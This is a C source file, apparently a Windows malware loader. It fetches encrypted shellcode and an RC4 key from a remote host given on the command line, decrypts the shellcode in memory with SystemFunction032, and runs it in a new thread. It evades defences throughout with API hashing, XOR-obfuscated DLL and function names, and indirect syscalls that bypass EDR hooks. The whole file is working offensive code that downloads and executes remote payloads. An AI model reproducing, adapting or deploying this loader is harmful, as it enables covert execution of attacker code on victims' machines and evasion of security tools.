#include "commun.h"

typedef struct {
    DWORD	Length;
    DWORD	MaximumLength;
    PVOID	Buffer;
} Crypt, * PCrypt;



typedef VOID(WINAPI* SystemFunction032_t)(PCrypt Img, PCrypt Key);
SystemFunction032_t pSystemFunction032 = NULL;

typedef HMODULE(WINAPI* LoadLibraryA_t)(LPCSTR lpLibFileName);
LoadLibraryA_t pLoadLibraryA = NULL;


int main(int argc, char** argv) {

    char* host = NULL;
    char* port = NULL;
    char* cipher = NULL;
    char* key = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--host") == 0) {
            if (i + 1 < argc) {
                host = argv[++i];
            }
            else {
                fprintf(stderr, "Missing argument for -h/--host\n");
                return 1;
            }
        }
        else if (strcmp(argv[i], "-p") == 0 || strcmp(argv[i], "--port") == 0) {
            if (i + 1 < argc) {
                port = argv[++i];
            }
            else {
                fprintf(stderr, "Missing argument for -p/--port\n");
                return 1;
            }
        }
        else if (strcmp(argv[i], "-c") == 0 || strcmp(argv[i], "--cipher") == 0) {
            if (i + 1 < argc) {
                cipher = argv[++i];
            }
            else {
                fprintf(stderr, "Missing argument for -c/--cipher\n");
                return 1;
            }
        }
        else if (strcmp(argv[i], "-k") == 0 || strcmp(argv[i], "--key") == 0) {
            if (i + 1 < argc) {
                key = argv[++i];
            }
            else {
                fprintf(stderr, "Missing argument for -k/--key\n");
                return 1;
            }
        }
        else {
            fprintf(stderr, "Unknown option: %s\n", argv[i]);
            return 1;
        }
    }

    if (host == NULL || port == NULL || cipher == NULL || key == NULL) {
        fprintf(stderr, "\n\n[?] Usage:\n\n\t -h / --host for host\n\t -p / --port for port\n\t -c / --cipher for cipher\n\t -k / --key for key\n\n\n");
        return 1;
    }

    //printf("\n\n\n\tHost:\t %s\n", host);
    //printf("\tPort:\t %s\n", port);
    //printf("\tCipher:\t %s\n", cipher);
    //printf("\tKey:\t %s\n", key);


    printf("\n\n[+] Retrieving cipher shellcode\n\n");
	DATA shellcode = getFilelessData(host, port, cipher);

	if (!shellcode.data) {
		printf("[-] Failed in retrieving shellcode (%u)\n", GetLastError());
		return -1;
	}

	printf("[+] Shellcode retrieved %p sized %d bytes\n",shellcode.data, shellcode.len);



    printf("\n\n[+] Retrieving key\n\n");
    DATA keydata = getFilelessData(host, port, key);

    if (!keydata.data) {
        printf("[-] Failed in retrieving key (%u)\n", GetLastError());
        return -1;
    }

    printf("[+] keydata retrieved %p sized %d bytes\n\n", keydata.data, keydata.len);
	
    PVOID BaseAddress = NULL;
    SIZE_T dwSize = shellcode.len;

    LPVOID addr = NULL;
    BYTE high = NULL;
    BYTE low = NULL;
    WORD syscallNum = NULL;
    INT_PTR syscallAddr = NULL;


    HMODULE ntdllAddr = getModuleBaseAddr(4097367);	// Hash of ntdll.dll

    //python GetHash.py ZwAllocateVirtualMemory
    addr = getAPIAddr(ntdllAddr, 18887768681269);	// Hash of ZwAllocateVirtualMemory

    syscallNum = GetSSN(addr);
    syscallAddr = GetsyscallInstr(addr);

    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddr);
    NTSTATUS status1 = sysZwAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 
                                    0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status1)) {
        printf("[-] Failed in sysZwAllocateVirtualMemory (%u)\n", GetLastError());
        return -1;
    }
    printf("[+] sysZwAllocateVirtualMemory executed !!\n");

    // Macro for moving data to memory
    MOVE_MEMORY(BaseAddress, shellcode.data, shellcode.len);

    
    char advapi32[] = { 0xeb, 0xce, 0xdc, 0xcb, 0xda, 0xc3, 0x99, 0x98, 0xaa };
    char sysFunc032[] = { 0xf9, 0xd3, 0xd9, 0xde, 0xcf, 0xc7, 0xec, 0xdf, 0xc4, 0xc9, 0xde, 0xc3, 0xc5, 0xc4, 0x9a, 0x99, 0x98, 0xaa };


    

    HMODULE krnlAddr = getModuleBaseAddr(109513359);	// Hash of kernel32.dll
  

    pLoadLibraryA = (LoadLibraryA_t)getAPIAddr(krnlAddr, 104173313); // Hash of LoadLibraryA
    
    // xor it to be "advapi32.dll"
    xor_aa((BYTE*)advapi32, sizeof(advapi32));

    HMODULE advapi32Addr = pLoadLibraryA(advapi32);
   
    // xor it back to hide it in memory
    xor_aa((BYTE*)advapi32, sizeof(advapi32));


    /// problem here , comparing strings :

    // i didn't use api hashing for that bcz of hash collision, the hashing function generate the same
    // hash for SystemFunction032 & SystemFunction018 :

    xor_aa((BYTE*)sysFunc032, sizeof(sysFunc032));

    pSystemFunction032 = (SystemFunction032_t)GetProcAddress(advapi32Addr, sysFunc032);

    xor_aa((BYTE*)sysFunc032, sizeof(sysFunc032));

    // decrypt the shellcode


    Crypt Mem = { 0 };
    Crypt Key = { 0 };

    Mem.Buffer = BaseAddress;
    Mem.Length = Mem.MaximumLength = shellcode.len;

    Key.Buffer = keydata.data;
    Key.Length = Key.MaximumLength  = keydata.len;

    pSystemFunction032(&Mem, &Key);

    DWORD OldProtect = 0;

    addr = getAPIAddr(ntdllAddr, 6180333595348);


    syscallNum = GetSSN(addr);
    syscallAddr = GetsyscallInstr(addr);

    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddr);
    NTSTATUS NtProtectStatus1 = sysNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize, PAGE_EXECUTE_READ, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus1)) {
        printf("[-] Failed in sysNtProtectVirtualMemory (%u)\n", GetLastError());
        return -2;
    }
    printf("[+] sysNtProtectVirtualMemory executed !!\n");


    HANDLE hHostThread = INVALID_HANDLE_VALUE;

    //python GetHash.py NtCreateThreadEx
    addr = getAPIAddr(ntdllAddr, 8454456120);	// Hash of NtCreateThreadEx

    syscallNum = GetSSN(addr);
    syscallAddr = GetsyscallInstr(addr);

    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddr);
    NTSTATUS NtCreateThreadstatus = sysNtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
    if (!NT_SUCCESS(NtCreateThreadstatus)) {
        printf("[!] Failed in sysNtCreateThreadEx (%u)\n", GetLastError());
        return 3;
    }
    printf("[+] sysNtCreateThreadEx executed !!\n");


    LARGE_INTEGER* Timeout = NULL;

    //python GetHash.py NtWaitForSingleObject
    addr = getAPIAddr(ntdllAddr, 2060238558140);	// Hash of NtWaitForSingleObject

    syscallNum = GetSSN(addr);
    syscallAddr = GetsyscallInstr(addr);

    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddr);
    NTSTATUS NTWFSOstatus = sysNtWaitForSingleObject(hHostThread, FALSE, Timeout);
    if (!NT_SUCCESS(NTWFSOstatus)) {
        printf("[!] Failed in sysNtWaitForSingleObject (%u)\n", GetLastError());
        return 4;
    }
    printf("[+] sysNtWaitForSingleObject executed !!\n");

    printf("[+] Finished !!!\n");

	return 0;

}